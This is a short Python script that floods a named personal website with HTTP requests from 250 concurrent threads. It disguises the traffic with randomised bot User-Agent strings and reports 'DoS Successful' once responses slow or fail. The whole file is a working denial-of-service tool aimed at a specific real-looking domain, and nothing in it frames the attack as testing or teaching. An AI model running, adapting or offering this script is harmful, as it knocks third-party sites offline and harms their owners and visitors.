import requests
import threading
import time
import random

l = []      # for response times
rl = []     # for request rate

def current_mil_time():
    return round(time.time() * 1000)

def current_sec_time():
    return round(time.time())

def count_resp_time(time_took):
    global l
    t = current_sec_time()
    l.append({"time_took": time_took, "time_received": t})
    # clean old entries
    l = [e for e in l if current_sec_time() - e["time_received"] < 1]

def count_request():
    global rl
    t = current_sec_time()
    rl.append({"time_received": t})
    rl = [e for e in rl if current_sec_time() - e["time_received"] < 1]

message = "Dosing..."
def make_request(thread_id):
    global message
    while True:
        try:
            s = current_mil_time()
            # randomize a bit so you don't look like total bot
            headers = {"User-Agent": f"MetalDickBot-{thread_id}-{random.randint(1000,9999)}"}
            r = requests.get('https://dharunashokkumar.com', headers=headers, timeout=5)
            t = current_mil_time() - s
            count_resp_time(t)
            count_request()
        except:
            message = "DoS Successful. Site looks down for now."

threads = 250
for i in range(threads):  # cleaner loop
    x = threading.Thread(target=make_request, args=(i,), daemon=True)
    print(f"Starting thread #{i}...")
    x.start()

print("calculating..... wait for a while for it to adjust...")
while True:
    time.sleep(1)
    response_time = 0
    for e in l:
        response_time += e['time_took']
    avg = round(response_time / len(l), 2) if len(l) > 0 else 0
    
    if avg > 60000:
        message = "DoS Successful. Site looks down for now."
    else:
        message = "Dosing...."
    
    print(f"\rAvg response: {avg}ms | Requests/sec: {len(rl)} | Responses/sec: {len(l)} | {message}", end="")